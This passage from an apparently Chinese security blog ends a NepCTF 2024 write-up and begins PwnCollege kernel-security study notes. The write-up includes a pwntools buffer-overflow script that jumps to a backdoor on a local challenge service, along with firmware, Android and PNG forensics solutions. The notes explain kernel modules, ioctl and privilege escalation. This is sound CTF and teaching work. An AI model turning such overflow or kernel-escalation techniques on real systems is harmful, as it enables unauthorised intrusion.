class="hljs-title"></span><br><span class="hljs-title">seg000:0069</span> CD 16<span class="hljs-title">                         int</span>     16h                             ;<span class="hljs-title"> KEYBOARD</span> -<span class="hljs-title"> READ</span> CHAR<span class="hljs-title"> FROM</span> BUFFER,<span class="hljs-title"> WAIT</span> IF<span class="hljs-title"> EMPTY</span><br>seg000:0069                                                                       ;<span class="hljs-title"> Return:</span> AH =<span class="hljs-title"> scan</span> code,<span class="hljs-title"> AL</span> =<span class="hljs-title"> character</span><br>seg000:0069<span class="hljs-title"></span><br><span class="hljs-title">seg000:006B</span> 3C 0D<span class="hljs-title">                         cmp</span> <span class="hljs-title">    al,</span> 0Dh<span class="hljs-title"></span><br><span class="hljs-title">seg000:006D</span> 74 07<span class="hljs-title">                         jz</span> <span class="hljs-title">     short</span> locret_76<span class="hljs-title"></span><br><span class="hljs-title">seg000:006D</span><br>seg000:006F<span class="hljs-title"> AA</span> <span class="hljs-title">                           stosb</span><br>seg000:0070<span class="hljs-title"> B4</span> 0E<span class="hljs-title">                         mov</span> <span class="hljs-title">    ah,</span> 0Eh<span class="hljs-title"></span><br><span class="hljs-title">seg000:0072</span> CD 10<span class="hljs-title">                         int</span>     10h                             ; -<span class="hljs-title"> VIDEO</span> -<span class="hljs-title"> WRITE</span> CHARACTER<span class="hljs-title"> AND</span> ADVANCE<span class="hljs-title"> CURSOR</span> (TTY<span class="hljs-title"> WRITE)</span><br>seg000:0072                                                                       ;<span class="hljs-title"> AL</span> =<span class="hljs-title"> character,</span> BH =<span class="hljs-title"> display</span> page (alpha<span class="hljs-title"> modes)</span><br>seg000:0072                                                                       ;<span class="hljs-title"> BL</span> =<span class="hljs-title"> foreground</span> color (graphics<span class="hljs-title"> modes)</span><br>seg000:0072<span class="hljs-title"></span><br><span class="hljs-title">seg000:0074</span> EB<span class="hljs-title"> F1</span> <span class="hljs-title">                        jmp</span> <span class="hljs-title">    short</span> loc_67<span class="hljs-title"></span><br><span class="hljs-title">seg000:0074</span><br>seg000:0076                               ; ---------------------------------------------------------------------------<span class="hljs-title"></span><br><span class="hljs-title">seg000:0076</span><br>seg000:0076<span class="hljs-title">                               locret_76:</span>                              ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> sub_5E+F↑j</span><br>seg000:0076<span class="hljs-title"> C9</span> <span class="hljs-title">                           leave</span><br>seg000:0077<span class="hljs-title"> C3</span> <span class="hljs-title">                           retn</span><br></code></pre></td></tr></table></figure><p>溢出改返回地址为后门即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">8866</span>)<br>sleep(<span class="hljs-number">3</span>)<br>backdoor = <span class="hljs-number">0x2e</span><br>io.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">2</span>) + p16(backdoor)+<span class="hljs-string">b&#x27;\x0d&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>flag输出后马上消失了，录视频暂停找flag</p><p><img src="/2024/08/26/2024NepCTFwriteup/2.png" alt="2"></p><h2 id="nepWRT"><a href="#nepWRT" class="headerlink" title="nepWRT??"></a>nepWRT??</h2><p>给了一个openwrt固件的文件系统</p><p>发现初始化脚本里会往<code>/www/init.etc</code>写东西，形似bsae64，然后把这个文件的内容输出到<code>n3pF1@g</code>，grep找出所有写入操作</p><p><img src="/2024/08/26/2024NepCTFwriteup/3.png" alt="3"></p><p>S表示启动脚本，K表示终止脚本，数字越小越先启动</p><p><img src="/2024/08/26/2024NepCTFwriteup/4.png" alt="4"></p><p>按启动顺序对base64片段排序，有几处顺序不对，多尝试就行</p><p><img src="/2024/08/26/2024NepCTFwriteup/5.png" alt="5"></p><h2 id="火眼金睛"><a href="#火眼金睛" class="headerlink" title="火眼金睛"></a>火眼金睛</h2><p>arm小端的Vxworks固件符号表分析，之前写过<a href="https://lkliki.github.io/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/">相关文章</a></p><p>流程：binwalk提取固件 -&gt; 根据大小找到vxworks文件 -&gt; grep找符号表文件 -&gt; ida python脚本修复Vxworks文件的符号表</p><p>修复符号表过程中报错提示<code>7GFXFGMLHNB2F6MLOL53FQ5ZQOJ</code>和<code>TUNAZXE7I=mote_sta_info</code>是非法函数名称</p><p>16进制查看器找到这里</p><p><img src="/2024/08/26/2024NepCTFwriteup/6.png" alt="6"></p><p>之后试了base64不对就去找别的点了，卡了半天，后来给了hint确认是这个点才发现是base32</p><p><img src="/2024/08/26/2024NepCTFwriteup/7.png" alt="7"></p><h2 id="0ezAndroid"><a href="#0ezAndroid" class="headerlink" title="0ezAndroid"></a>0ezAndroid</h2><p>用mt管理器把点击后的弹窗和随机位置变换的函数调用注释掉后重新编译打包安装</p><p>再用连点器一直点按钮得到flag</p><p><img src="/2024/08/26/2024NepCTFwriteup/8.jpg" alt="8"></p><h2 id="Nemophila"><a href="#Nemophila" class="headerlink" title="Nemophila"></a>Nemophila</h2><p>审计mini.py得到压缩包密码<code>secret_is&#123;Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve&#125;</code></p><p>解压压缩包得到png图片，查看hex发现加密了。把加密的前4个字节和正常的png头部<code>.PNG</code>异或,得到<code>secr</code>，猜测和压缩包密码循环异或加密。</p><p>解密得到png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;miaomiao.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> img:<br>    cipher = img.read()<br><br>key = <span class="hljs-string">&#x27;secret_is&#123;Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve&#125;&#x27;</span><br><br>data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)):<br>    data.append(<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-number">48</span>]) ^ cipher[i])<br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;miaomiao_dec.png&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> out:<br>    out.write(<span class="hljs-built_in">bytes</span>(data))<br></code></pre></td></tr></table></figure><p>打开图片没flag，检查IHDR隐写，通过crc爆破图片宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> sys<br><br>filename = sys.argv[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    all_b = f.read()<br>    crc32key = <span class="hljs-built_in">int</span>(all_b[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>].<span class="hljs-built_in">hex</span>(),<span class="hljs-number">16</span>)<br>    data = <span class="hljs-built_in">bytearray</span>(all_b[<span class="hljs-number">12</span>:<span class="hljs-number">29</span>])<br>    n = <span class="hljs-number">4095</span><br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n): <br>        width = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, w))<br>        <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            height = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, h))<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                data[x+<span class="hljs-number">4</span>] = width[x]<br>                data[x+<span class="hljs-number">8</span>] = height[x]<br>            crc32result = zlib.crc32(data)<br>            <span class="hljs-keyword">if</span> crc32result == crc32key:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;宽为：&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-built_in">print</span>(width)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;高为：&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-built_in">print</span>(height)<br>                exit(<span class="hljs-number">0</span>)<br>      <br><span class="hljs-comment">#宽为：bytearray(b&#x27;\x00\x00\x07]&#x27;)</span><br><span class="hljs-comment">#高为：bytearray(b&#x27;\x00\x00\x04\x1d&#x27;)</span><br></code></pre></td></tr></table></figure><p>16进制编辑器里对比发现高度被改小了，改回正常大小得到flag</p><p><img src="/2024/08/26/2024NepCTFwriteup/9.png" alt="9"></p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PwnCollege - SystemSecurity - KernelSecurity</title>
    <link href="/2024/03/27/PwnCollege-SystemSecurity-Kernel/"/>
    <url>/2024/03/27/PwnCollege-SystemSecurity-Kernel/</url>
    
    <content type="html"><![CDATA[<h1 id="PwnCollege-SystemSecurity-Kernel-Security"><a href="#PwnCollege-SystemSecurity-Kernel-Security" class="headerlink" title="PwnCollege - SystemSecurity - Kernel Security"></a>PwnCollege - SystemSecurity - Kernel Security</h1><p>内核是操作系统的核心组件，是软件和硬件之间的桥梁。 内核运行在操作系统的最底层，其访问权限非常高，就像是冒充系统本身，甚至超越了root用户的最高权限。 内核安全至关重要，因为此级别的漏洞使攻击者可以像系统一样行事。 漏洞可能会导致未经授权的数据访问、系统崩溃或 rootkit 静默安装等情况。</p><h2 id="Lecture-and-Reading"><a href="#Lecture-and-Reading" class="headerlink" title="Lecture and Reading"></a>Lecture and Reading</h2><h3 id="Introductiom"><a href="#Introductiom" class="headerlink" title="Introductiom"></a>Introductiom</h3><p>仅限内核使用的资源的例子：</p><ul><li><code>hlt</code>指令,使CPU暂停</li><li><code>in</code>和<code>out</code>指令，使CPU和硬件外设交互</li><li><code>cr3</code>寄存器，该寄存器是对页表的引用，用于将进程的虚拟内存地址转换成ram中的物理地址，可在内核模式下使用<code>mov</code>指令访问。</li><li><code>MSR_LSTAR</code>寄存器，定义了syscall后跳转到的地址，可使用<code>wrmsr</code>和<code>rdmsr</code>指令访问。</li></ul><p>就像操作系统追踪用户的UID一样，CPU追踪当前的特权级别来控制对资源的访问权。特权级别使用环(rings)来表示。</p><ul><li>Ring3：用户空间，限制非常严格</li><li>Ring2&amp;1：通常不使用，部分设备驱动运行在该级别</li><li>Ring0:内核空间，无限制，<code>supervisor mode</code></li></ul><p>随着虚拟机的兴起，Supervisor mode特权开始引发一系列问题。虚拟机的”客户”内核不应该无限制地访问宿主机物理硬件。</p><ul><li>2000年初虚拟机刚出现时的解决方案：强制虚拟机内核运行在Ring1，这导致需要复杂且昂贵的软件仿真方法来模拟Ring0的一些功能。</li><li>现代的解决方案：发明了<code>Hypervisor Mode</code>，即客户机内核运行在Ring0，但是其敏感的Ring0特权动作会被虚拟机管理程序拦截并在宿主操作系统中被处理。</li></ul><p>根据内核与驱动程序和用户程序交互方式的不同，存在不同的操作系统模型</p><ul><li>宏内核(monolithic kernel):有一个单一的内核二进制文件来处理所有操作系统级别的任务。驱动作为模块加载到内核中，一起运行在ring0权限。典型的宏内核操作系统有：Linux、FreeBSD。</li><li>微内核(microk kernel)：只有一个具有最基础的硬件和进程交互功能的微型内核二进制文件运行在Ring0层，驱动程序等其它所有程序运行在特权较低的环中。当其它程序需要进行硬件访问等Ring0操作时，需要请求内核。微内核组件和组件、组件和内核间通信成本高，运行效率低，安全性高，常用于对安全性要求较高的操作系统中，如：Minux、seL4。</li><li>混合内核(hybird kernel)：同时具有宏内核和微内核的特征。混合内核的操作系统有：Windows(NT)、MacOS。MacOS在FreeBSD的基础上增加了一大堆苹果拓展，有一个整体内核，但拓展是微内核的特征。Windows中ntdll等是微内核组件，驱动和内核等都在ring0运行。</li></ul><p>x86&#x2F;64架构下的Rings间切换</p><p>1.boot阶段，在Ring0层，内核设置MSR_LSTAR寄存器指向名为<code>entry_SYSCALL</code>(<code>entry_SYSCALL_64</code>)的系统调用处理程序。</p><p>2.当用户空间进程想要和内核交互时，调用syscall:</p><ul><li>特权级别切换至Ring0</li><li>控制流跳转至<code>MSR_LSTAR</code>寄存器中的值</li><li>将返回地址保存到<code>rcx</code>寄存器</li><li>这个链接可以查看syscall的伪代码：<a href="https://www.felixcloutier.com/x86/syscall">https://www.felixcloutier.com/x86/syscall</a></li></ul><p>3.当内核准备返回用户空间时，它调用对应的返回指令(比如<code>sysret</code>对应<code>syscall</code>)</p><ul><li>特权级别切换至Ring3</li><li>控制流跳转至<code>rcx</code>寄存器中的值</li></ul><p>x64虚拟内存中，用户空间和内核空间是相邻的，用户空间地址在低地址(最高以0x7f开头)，内核空间在高地址(通常以0xff开头)</p><p><code>cat /proc/$$/maps</code>查看当前shell的内存映射;<code>cat /proc/self/maps</code>查看cat进程的内存映射;<code>cat /proc/pid/maps</code>查看对应pid进程的内存映射</p><p>内核内存通常是不可见的，除了vsyscall映射的页面。vsyscall映射了一个大小为0x1000的用户空间可以访问的内核页面。这是一个过时的优化，用于使系统调用更快。</p><p>攻击内核的几个方向：</p><p>1.从网络：一般是可远程触发的漏洞利用，比如发送精心构造的恶意网络数据包到目标机器上造成代码执行。该类漏洞在现在非常少见。</p><p>2.从用户空间：利用在内核的syscall处理程序和ioctl处理程序中存在的漏洞，这也是在沙箱模块中逃离沙箱进程的一种非常常见的方式。很多沙箱漏洞利用都通过发送来自沙箱的攻击向量到出于性能原因开放的内核接口来完成攻击。</p><p>3.从外围设备：从外接设备如可编程USB等发起内核攻击。例如：将恶意u盘插入嵌入式设备并实现代码执行。<a href="https://www.pjrc.com/teensy">https://www.pjrc.com/teensy</a></p><h3 id="Environment-setup"><a href="#Environment-setup" class="headerlink" title="Environment setup"></a>Environment setup</h3><p>内核开发和漏洞利用中的错误往往引起整个系统的崩溃，而不是简单的报错，因此最好在虚拟机中进行。</p><p>本课程的环境：<a href="https://github.com/pwncollege/pwnkernel">https://github.com/pwncollege/pwnkernel</a></p><p>该环境使用qemu作为模拟器，根目录下有flag文件和预编译的示例内核模块，包含各种命令(指向busybox的符号链接)，并且将当前的<code>~</code>目录挂载到了仿真机的<code>/home/ctf</code>目录，以便在宿主机中编译exploits后在仿真环境中运行。</p><p>注意：由于仿真机中没有动态链接库，编译程序时需要设置为静态链接并不依赖标准库，否则程序无法运行，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> exit.s</span><br>.global _start<br>.intel_syntax noprefix<br>_start:<br>xor eax,eax<br>mov al,60<br>syscall<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -static -nostdlib -o <span class="hljs-built_in">exit</span> exit.s</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">file <span class="hljs-built_in">exit</span></span><br>exit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=55c6c3c19b7e8ce3216dff2dde0153590362c50c, not stripped<br></code></pre></td></tr></table></figure><p>针对内核调试,仿真环境提供了：</p><ul><li>在编译时设置为保留符号的内核。</li><li>关闭了kernel ASLR</li><li>在launch.sh中，使用qemu仿真时添加了<code>-s</code>，表示在<code>1234</code>端口运行了<code>gdb server</code>。可以在宿主机中使用gdb连接到该端口来调试正在运行的linux内核。</li></ul><p>内核调试步骤如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb ~/Desktop/pwn.college/pwnkernel/linux-5.4/vmlinux</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote :1234</span><br>Remote debugging using :1234<br>default_idle () at arch/x86/kernel/process.c:581<br>......<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/i <span class="hljs-variable">$rip</span></span><br>=&gt; 0xffffffff81aac00e &lt;default_idle+30&gt;:        mov    ebp,DWORD PTR gs:[rip+0x7e56433b]        # 0x10350 &lt;cpu_number&gt;<br></code></pre></td></tr></table></figure><p>注意，开启调试后在gdb中按<code>c</code>，仿真环境的内核才会继续运行；内核调试中<code>ni</code>失效了，只能使用<code>si</code>进行单步调试。</p><p>要调试观察内核中用户态程序切换至内核态的过程，可以<code>objdump</code>反汇编查看程序的入口点，在入口点下断点后再在仿真环境中运行要调试的用户态程序。</p><p>这里在qemu仿真时用到的内核文件是<code>bzImage</code>,内核调试时载入gdb的内核文件是<code>vmlinux</code>，他们的区别可以参考<a href>ctf-wiki中常见内核文件介绍</a>。</p><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/1.png" alt="1"></p><p>进一步的阅读：</p><ul><li>内核利用环境搭建:<a href="https://www.nullbyte.cat/post/linux-kernel-exploit-development-environment/#environment-setup">https://www.nullbyte.cat/post/linux-kernel-exploit-development-environment/#environment-setup</a></li><li>内核调试:<a href="https://www.kernel.org/doc/Documentation/dev-tools/gdb-kernel-debugging.rst">https://www.kernel.org/doc/Documentation/dev-tools/gdb-kernel-debugging.rst</a></li><li>更丰富的内核实验环境:<a href="https://github.com/cirosantilli/linux-kernel-module-cheat">https://github.com/cirosantilli/linux-kernel-module-cheat</a></li></ul><h3 id="kernel-Modules"><a href="#kernel-Modules" class="headerlink" title="kernel Modules"></a>kernel Modules</h3><p><strong>内核模块是什么</strong></p><p>就像用户态程序装载库一样，内核模块加载到内核中以提供功能。</p><ul><li>内核模块是ELF文件(.ko而不是.so)</li><li>内核模块装载到内核空间的地址</li><li>内核模块中的代码和内核一样运行在ring0特权</li></ul><p>内核模块用于实现<code>设备驱动</code>(如显卡驱动)、<code>文件系统</code>、<code>网络功能</code>（如部分防火墙）等。</p><p><strong>内核模块的交互接口</strong></p><p>1.系统调用。历史上，内核模块通过修改内核的系统调用表，注册新的系统调用来和用户态交互。现代内核非常明确地不支持这一方式。该方式经常被<code>rootkits</code>用来隐藏系统上的恶意软件。</p><p>2.中断。内核模块能够通过<code>LIDT</code>和<code>LGDT</code>指令注册中断处理程序并且使其被类似<code>int 42</code>的指令触发。</p><p>有用的可<code>hook</code>单字节中断指令，可以创建内核模块，修改其中断处理函数后将单字节指令插入程序中以改变程序的执行流。</p><ul><li>int 3(0xcc):处理器执行到0xcc时，会陷入内核，执行int3的异常处理代码，给当前进程发送<code>SIGTRAP</code>信号，但是我们可以hook该中断号，使其执行其它异常处理程序。</li><li>int 1(0xf1):通常用于硬件调试，可以被hook。</li></ul><p>也可以hook无效操作码(如ud2指令)中断，通常该中断会引发<code>SIGKILL</code>信号。</p><ul><li>能够在软件中实现自定义指令。</li><li>该hook已经被用于安全改造：<a href="https://www.youtube.com/watch?v=OhQacawMxoY">https://www.youtube.com/watch?v=OhQacawMxoY</a></li></ul><p>3.文件。通过文件和内核模块交互是最常见的方式。</p><p>内核模块可以在以下的位置注册设备文件，应用程序通过对这些文件的读写和控制（open、write、poll等），可以和内核模块交互。设备文件通过<code>mknod</code>系统调用创建。</p><ul><li><code>/dev</code>：存放大部分传统设备(块设备和字符设备)的设备结点文件(比如<code>/dev/dsp</code>存放音频设备)。如果设备文件的设备号有对应的驱动，那么访问设备文件时可以和其设备驱动交互。</li><li><code>/proc</code>：属于特殊的<code>虚拟文件系统</code>，主要与系统内核和进程相关，包括进程ID、进程状态、进程命令行、系统状态、内核参数和配置等。最初用于获取正在运行进程的信息，Linux将其拓展为了一个混乱的内核接口。</li><li><code>/sys</code>：属于特殊的<code>虚拟文件系统</code>，主要与设备、驱动程序和硬件相关，包括设备名称、设备状态、设备驱动程序、硬件配置等。</li></ul><p>几种与设备文件交互的方式</p><p>1.内核模块为设备文件注册<code>read()</code>处理程序和<code>write()</code>处理程序，用户态读写时内核态中调用对应的函数进行处理。该方式适用于处理流数据(比如视频和音频数据)的内核模块。</p><p>内核模块分别注册<code>device_read</code>和<code>device_write</code>为读取和写入设 备时调用的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">device_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">char</span> *buffer,<span class="hljs-type">size_t</span> length,<span class="hljs-type">loff_t</span> *offset)</span><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">device_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">loff_t</span> *off)</span><br></code></pre></td></tr></table></figure><p>用户态读写设备文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/pwn-college&quot;</span>,<span class="hljs-number">0</span>);<br>read(fd,buffer,<span class="hljs-number">128</span>);<br></code></pre></td></tr></table></figure><p>2.<code>ioctl()</code>系统调用(全称Input&#x2F;Output Control)。相比read和write，ioctl提供了更灵活的接口，也很危险，很多漏洞都来自ioctl。该方式适用于非流数据的设置和检索,比如网络摄像头分辨率设置。</p><p>内核态注册ioctl处理函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">device_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ioctl_num,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ioctl_param)</span><br></code></pre></td></tr></table></figure><p>用户态调用ioctl进行交互: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/pwn-college&quot;</span>,<span class="hljs-number">0</span>)<br>ioctl(fd,COMMAND_CODE,&amp;custom_data_structure);<br></code></pre></td></tr></table></figure><p> <strong>用户态与内核交互时，内核模块做了什么</strong></p><p>理论上，宏内核中内核模块就相当于内核，它可以做任何事情，但是通常来说，内核会：</p><p>1.从用户空间读取数据(使用<code>copy_from_user</code>)</p><p>2.做一些事情来完成其功能(比如读写文件、和硬件交互等)</p><p>3.向用户空间写数据(使用<code>copy_to_user</code>)</p><p>4.返回用户空间</p><p><strong>构建和装载内核模块</strong></p><p>在本课程环境的<code>src</code>目录中，包含了示例内核模块。在环境中编写并编译自己的内核模块步骤如下：</p><ul><li>将内核模块源码(.c)放在<code>src</code>目录下</li><li>在<code>src</code>目录的<code>Makefile</code>文件的<code>obj-m</code>项后添加模块名.o</li><li>运行<code>build.sh</code></li></ul><p>内核模块(.ko文件)实际上是通过<code>init_module</code>系统调用装载的，但是通常我们使用<code>insmod</code>命令。</p><p>示例内核模块目录介绍，更详细可以阅读其源码</p><ul><li>hello_log:最简单的内核模块</li><li>hello_dev_char:在<code>/dev</code>目录下注册字符设备文件</li><li>hello_ioctl:在<code>/dev</code>目录下注册使用ioctl接口的字符设备文件</li><li>hello_proc_char:在<code>/proc</code>目录下注册字符设备文件</li><li>make_root: 在<code>/proc</code>目录下注册使用存在后门的ioctl接口的字符设备文件</li></ul><p>内核模块相关命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">lsmod  #列出当前内核中的模块<br>insmod #装载内核模块<br>rmmod  #删除内核模块<br>mknod  #创建设备结点文件<br></code></pre></td></tr></table></figure><h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>复习：内核态和用户态的内存复制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">copy_to_user(userspace_address,kernel_address,length);<br>copy_from_user(kernel_address,userspace_address,length);<br></code></pre></td></tr></table></figure><p>内核的内存一定不能被损坏，否则可能导致以下后果：</p><ul><li>系统崩溃</li><li>系统阻塞</li><li>进程权限非法提升</li><li>和其它进程的交互</li></ul><p>用户态的数据应该被小心处理，确保只被<code>copy_to_user</code>和<code>copy_from_user</code>访问。</p><p><strong>经典内核漏洞利用 - 进程权限提升</strong></p><p>内核会通过<code>task_struct</code>结构体跟踪正在运行的进程的权限，每个进程都有一个<code>task_struct</code>。</p><p><code>task_struct</code>在内核源码中位于<a href="https://elixir.bootlin.com/linux/v6.8-rc7/source/include/linux/sched.h"><code>include/linux/sched.h</code></a>。源码很长，以下源码在视频中缩略版的基础上根据最新版<code>v6.8-rc7</code>源码增加了<code>ptracer_cred</code>这一项。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> <span class="hljs-title">thread_info</span>;</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">long</span> state;<br>    <span class="hljs-type">void</span> *<span class="hljs-built_in">stack</span>;<br>    <span class="hljs-type">atomic_t</span> usage;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-type">int</span> prio;<br>    <span class="hljs-type">int</span> static_prio;<br>    <span class="hljs-type">int</span> normal_prio;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rt_priority;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sched_info</span> <span class="hljs-title">sched_info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">tasks</span>;</span><br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">pid_t</span> tgid;<br>    <br>  <span class="hljs-comment">/* Process credentials: */</span><br><br><span class="hljs-comment">/* Tracer&#x27;s credentials at attach: */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">ptracer_cred</span>;</span><br><br><span class="hljs-comment">/* Objective and real subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">real_cred</span>;</span><br><br><span class="hljs-comment">/* Effective (overridable) subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">cred</span>;</span><br>    <span 